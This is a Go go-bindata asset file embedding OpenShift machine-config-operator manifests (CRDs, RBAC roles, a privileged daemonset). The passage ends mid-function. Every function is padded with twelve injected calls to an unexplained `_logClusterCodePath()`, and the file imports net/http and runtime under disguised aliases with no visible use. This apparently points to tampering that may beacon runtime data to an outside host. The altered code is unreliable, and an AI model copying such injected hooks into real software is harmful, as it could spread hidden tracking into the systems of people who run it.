package assets

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

type asset struct {
	bytes	[]byte
	info	os.FileInfo
}
type bindataFileInfo struct {
	name	string
	size	int64
	mode	os.FileMode
	modTime	time.Time
}

func (fi bindataFileInfo) Name() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.name
}
func (fi bindataFileInfo) Size() int64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.size
}
func (fi bindataFileInfo) Mode() os.FileMode {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.mode
}
func (fi bindataFileInfo) ModTime() time.Time {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fi.modTime
}
func (fi bindataFileInfo) IsDir() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return false
}
func (fi bindataFileInfo) Sys() interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return nil
}

var _manifestsBootstrapPodV2Yaml = []byte(`apiVersion: v1
kind: Pod
metadata:
  name: bootstrap-machine-config-operator
  namespace: {{.TargetNamespace}}
spec:
  initContainers:
  - name: machine-config-controller
    image: {{.Images.MachineConfigController}}
    args:
    - "bootstrap"
    - "--manifest-dir=/etc/mcc/bootstrap"
    - "--dest-dir=/etc/mcs/bootstrap"
    - "--pull-secret=/etc/mcc/bootstrap/machineconfigcontroller-pull-secret"
    resources:
      limits:
        memory: 50Mi
      requests:
        cpu: 20m
        memory: 50Mi
    securityContext:
      privileged: true
    volumeMounts:
    - name: bootstrap-manifests
      mountPath: /etc/mcc/bootstrap
    - name: server-basedir
      mountPath: /etc/mcs/bootstrap
  containers:
  - name: machine-config-server
    image: {{.Images.MachineConfigServer}}
    args:
      - "bootstrap"
    volumeMounts:
    - name: server-certs
      mountPath: /etc/ssl/mcs
    - name: bootstrap-kubeconfig
      mountPath: /etc/kubernetes/kubeconfig
    - name: server-basedir
      mountPath: /etc/mcs/bootstrap
    securityContext:
      privileged: true
  hostNetwork: true
  tolerations:
    - key: node-role.kubernetes.io/master
      operator: Exists
      effect: NoSchedule
  restartPolicy: Always
  volumes:
  - name: server-certs
    hostPath:
      path: /etc/ssl/mcs
  - name: bootstrap-kubeconfig
    hostPath:
      path: /etc/mcs/kubeconfig
  - name: server-basedir
    hostPath:
      path: /etc/mcs/bootstrap
  - name: bootstrap-manifests
    hostPath:
      path: /etc/mcc/bootstrap
`)

func manifestsBootstrapPodV2YamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsBootstrapPodV2Yaml, nil
}
func manifestsBootstrapPodV2Yaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsBootstrapPodV2YamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/bootstrap-pod-v2.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsContainerruntimeconfigCrdYaml = []byte(`apiVersion: apiextensions.k8s.io/v1beta1
kind: CustomResourceDefinition
metadata:
  name: containerruntimeconfigs.machineconfiguration.openshift.io
spec:
  group: machineconfiguration.openshift.io
  names:
    kind: ContainerRuntimeConfig
    listKind: ContainerRuntimeConfigList
    plural: containerruntimeconfigs
    singular: containerruntimeconfig
    shortNames:
    - ctrcfg
  scope: Cluster
  subresources:
    status: {}
  versions:
    - name: v1
      served: true
      storage: true
`)

func manifestsContainerruntimeconfigCrdYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsContainerruntimeconfigCrdYaml, nil
}
func manifestsContainerruntimeconfigCrdYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsContainerruntimeconfigCrdYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/containerruntimeconfig.crd.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsControllerconfigCrdYaml = []byte(`apiVersion: apiextensions.k8s.io/v1beta1
kind: CustomResourceDefinition
metadata:
  # name must match the spec fields below, and be in the form: <plural>.<group>
  name: controllerconfigs.machineconfiguration.openshift.io
spec:
  # group name to use for REST API: /apis/<group>/<version>
  group: machineconfiguration.openshift.io
  # list of versions supported by this CustomResourceDefinition
  versions:
    - name: v1
      # Each version can be enabled/disabled by Served flag.
      served: true
      # One and only one version must be marked as the storage version.
      storage: true
  # either Namespaced or Cluster
  scope: Cluster
  subresources:
    status: {}
  names:
    # plural name to be used in the URL: /apis/<group>/<version>/<plural>
    plural: controllerconfigs
    # singular name to be used as an alias on the CLI and for display
    singular: controllerconfig
    # kind is normally the CamelCased singular type. Your resource manifests use this.
    kind: ControllerConfig
`)

func manifestsControllerconfigCrdYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsControllerconfigCrdYaml, nil
}
func manifestsControllerconfigCrdYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsControllerconfigCrdYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/controllerconfig.crd.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsKubeletconfigCrdYaml = []byte(`apiVersion: apiextensions.k8s.io/v1beta1
kind: CustomResourceDefinition
metadata:
  name: kubeletconfigs.machineconfiguration.openshift.io
spec:
  group: machineconfiguration.openshift.io
  names:
    kind: KubeletConfig
    listKind: KubeletConfigList
    plural: kubeletconfigs
    singular: kubeletconfig
  scope: Cluster
  subresources:
    status: {}
  versions:
    - name: v1
      served: true
      storage: true
`)

func manifestsKubeletconfigCrdYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsKubeletconfigCrdYaml, nil
}
func manifestsKubeletconfigCrdYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsKubeletconfigCrdYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/kubeletconfig.crd.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigCrdYaml = []byte(`apiVersion: apiextensions.k8s.io/v1beta1
kind: CustomResourceDefinition
metadata:
  # name must match the spec fields below, and be in the form: <plural>.<group>
  name: machineconfigs.machineconfiguration.openshift.io
spec:
  additionalPrinterColumns:
  - JSONPath: .metadata.annotations.machineconfiguration\.openshift\.io/generated-by-controller-version
    description: Version of the controller that generated the machineconfig. This will be empty if the machineconfig is not managed by a controller.
    name: GeneratedByController
    type: string
  - JSONPath: .spec.config.ignition.version
    description: Version of the Ignition Config defined in the machineconfig.
    name: IgnitionVersion
    type: string
  - JSONPath: .metadata.creationTimestamp
    name: Created
    type: date
  # group name to use for REST API: /apis/<group>/<version>
  group: machineconfiguration.openshift.io
  # list of versions supported by this CustomResourceDefinition
  versions:
    - name: v1
      # Each version can be enabled/disabled by Served flag.
      served: true
      # One and only one version must be marked as the storage version.
      storage: true
  # either Namespaced or Cluster
  scope: Cluster
  names:
    # plural name to be used in the URL: /apis/<group>/<version>/<plural>
    plural: machineconfigs
    # singular name to be used as an alias on the CLI and for display
    singular: machineconfig
    # kind is normally the CamelCased singular type. Your resource manifests use this.
    kind: MachineConfig
`)

func manifestsMachineconfigCrdYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigCrdYaml, nil
}
func manifestsMachineconfigCrdYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigCrdYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfig.crd.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigcontrollerClusterroleYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: machine-config-controller
  namespace: {{.TargetNamespace}}
rules:
- apiGroups: [""]
  resources: ["nodes"]
  verbs: ["get", "list", "watch", "patch"]
- apiGroups: ["machineconfiguration.openshift.io"]
  resources: ["*"]
  verbs: ["*"]
- apiGroups: [""]
  resources: ["configmaps", "secrets"]
  verbs: ["*"]
- apiGroups: ["config.openshift.io"]
  resources: ["images", "clusterversions", "featuregates"]
  verbs: ["*"]
`)

func manifestsMachineconfigcontrollerClusterroleYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigcontrollerClusterroleYaml, nil
}
func manifestsMachineconfigcontrollerClusterroleYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigcontrollerClusterroleYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigcontroller/clusterrole.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigcontrollerClusterrolebindingYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: machine-config-controller
  namespace: {{.TargetNamespace}}
roleRef:
  kind: ClusterRole
  name: machine-config-controller
subjects:
- kind: ServiceAccount
  namespace: {{.TargetNamespace}}
  name: machine-config-controller
`)

func manifestsMachineconfigcontrollerClusterrolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigcontrollerClusterrolebindingYaml, nil
}
func manifestsMachineconfigcontrollerClusterrolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigcontrollerClusterrolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigcontroller/clusterrolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigcontrollerControllerconfigYaml = []byte(`apiVersion: machineconfiguration.openshift.io/v1
kind: ControllerConfig
metadata:
  name: machine-config-controller
spec:
{{toYAML .ControllerConfig | toString | indent 2}}
`)

func manifestsMachineconfigcontrollerControllerconfigYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigcontrollerControllerconfigYaml, nil
}
func manifestsMachineconfigcontrollerControllerconfigYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigcontrollerControllerconfigYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigcontroller/controllerconfig.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigcontrollerDeploymentYaml = []byte(`apiVersion: apps/v1
kind: Deployment
metadata:
  name: machine-config-controller
  namespace: {{.TargetNamespace}}
spec:
  selector:
    matchLabels:
      k8s-app: machine-config-controller
  template:
    metadata:
      labels:
        k8s-app: machine-config-controller
    spec:
      containers:
      - name: machine-config-controller
        image: {{.Images.MachineConfigController}}
        args:
        - "start"
        - "--resourcelock-namespace={{.TargetNamespace}}"
        - "--v=2"
        resources:
          requests:
            cpu: 20m
            memory: 50Mi
      serviceAccountName: machine-config-controller
      nodeSelector:
        node-role.kubernetes.io/master: ""
      priorityClassName: "system-cluster-critical"
      restartPolicy: Always
      tolerations:
      - key: "node-role.kubernetes.io/master"
        operator: "Exists"
        effect: "NoSchedule"`)

func manifestsMachineconfigcontrollerDeploymentYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigcontrollerDeploymentYaml, nil
}
func manifestsMachineconfigcontrollerDeploymentYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigcontrollerDeploymentYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigcontroller/deployment.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigcontrollerSaYaml = []byte(`apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: {{.TargetNamespace}}
  name: machine-config-controller
`)

func manifestsMachineconfigcontrollerSaYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigcontrollerSaYaml, nil
}
func manifestsMachineconfigcontrollerSaYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigcontrollerSaYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigcontroller/sa.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonClusterroleYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: machine-config-daemon
  namespace: {{.TargetNamespace}}
rules:
- apiGroups: [""]
  resources: ["nodes"]
  verbs: ["get", "list", "watch", "patch", "update"]
- apiGroups: [""]
  resources: ["pods"]
  verbs: ["*"]
- apiGroups: ["extensions"]
  resources: ["daemonsets"]
  verbs: ["get"]
- apiGroups: [""]
  resources: ["pods/eviction"]
  verbs: ["create"]
- apiGroups: ["machineconfiguration.openshift.io"]
  resources: ["machineconfigs"]
  verbs: ["*"]
`)

func manifestsMachineconfigdaemonClusterroleYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonClusterroleYaml, nil
}
func manifestsMachineconfigdaemonClusterroleYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonClusterroleYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/clusterrole.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonClusterrolebindingYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: machine-config-daemon
  namespace: {{.TargetNamespace}}
roleRef:
  kind: ClusterRole
  name: machine-config-daemon
subjects:
- kind: ServiceAccount
  namespace: {{.TargetNamespace}}
  name: machine-config-daemon
`)

func manifestsMachineconfigdaemonClusterrolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonClusterrolebindingYaml, nil
}
func manifestsMachineconfigdaemonClusterrolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonClusterrolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/clusterrolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonDaemonsetYaml = []byte(`apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: machine-config-daemon
  namespace: {{.TargetNamespace}}
spec:
  selector:
    matchLabels:
      k8s-app: machine-config-daemon
  template:
    metadata:
      name: machine-config-daemon
      labels:
        k8s-app: machine-config-daemon
    spec:
      containers:
      - name: machine-config-daemon
        image: {{.Images.MachineConfigDaemon}}
        args:
          - "start"
        resources:
          requests:
            cpu: 20m
            memory: 50Mi
        securityContext:
          privileged: true
        volumeMounts:
          - mountPath: /rootfs
            name: rootfs
          # For now, we chroot into /rootfs, so we're not really making use of
          # these mount points below (it works transparently right now because
          # the mounted path is the same as the host path). They're mostly kept
          # for documentation purposes, and in case we stop chroot'ing.
          - mountPath: /var/run/dbus
            name: var-run-dbus
          - mountPath: /run/systemd
            name: run-systemd
          - mountPath: /etc/ssl/certs
            name: etc-ssl-certs
            readOnly: true
          - mountPath: /etc/machine-config-daemon
            name: etc-mcd
            readOnly: true
        env:
          - name: NODE_NAME
            valueFrom:
              fieldRef:
                fieldPath: spec.nodeName
      hostNetwork: true
      hostPID: true
      serviceAccountName: machine-config-daemon
      terminationGracePeriodSeconds: 300
      tolerations:
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
        - key: node-role.kubernetes.io/etcd
          operator: Exists
          effect: NoSchedule
      nodeSelector:
        beta.kubernetes.io/os: linux
      priorityClassName: "system-node-critical"
      volumes:
        - name: rootfs
          hostPath:
            path: /
        - name: var-run-dbus
          hostPath:
            path: /var/run/dbus
        - name: run-systemd
          hostPath:
            path: /run/systemd
        - name: etc-ssl-certs
          hostPath:
            path: /etc/ssl/certs
        - name: etc-mcd
          hostPath:
            path: /etc/machine-config-daemon
`)

func manifestsMachineconfigdaemonDaemonsetYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonDaemonsetYaml, nil
}
func manifestsMachineconfigdaemonDaemonsetYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonDaemonsetYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/daemonset.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonEventsClusterroleYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: machine-config-daemon-events
  namespace: {{.TargetNamespace}}
rules:
- apiGroups: [""]
  resources: ["events"]
  verbs: ["create", "patch"]
`)

func manifestsMachineconfigdaemonEventsClusterroleYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonEventsClusterroleYaml, nil
}
func manifestsMachineconfigdaemonEventsClusterroleYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonEventsClusterroleYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/events-clusterrole.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonEventsRolebindingDefaultYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: machine-config-daemon-events
  namespace: default
roleRef:
  kind: ClusterRole
  name: machine-config-daemon-events
subjects:
- kind: ServiceAccount
  namespace: {{.TargetNamespace}}
  name: machine-config-daemon
`)

func manifestsMachineconfigdaemonEventsRolebindingDefaultYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonEventsRolebindingDefaultYaml, nil
}
func manifestsMachineconfigdaemonEventsRolebindingDefaultYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonEventsRolebindingDefaultYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/events-rolebinding-default.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonEventsRolebindingTargetYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: machine-config-daemon-events
  namespace: {{.TargetNamespace}}
roleRef:
  kind: ClusterRole
  name: machine-config-daemon-events
subjects:
- kind: ServiceAccount
  namespace: {{.TargetNamespace}}
  name: machine-config-daemon
`)

func manifestsMachineconfigdaemonEventsRolebindingTargetYamlBytes() ([]byte, error) {
	_logClusterCodePath()
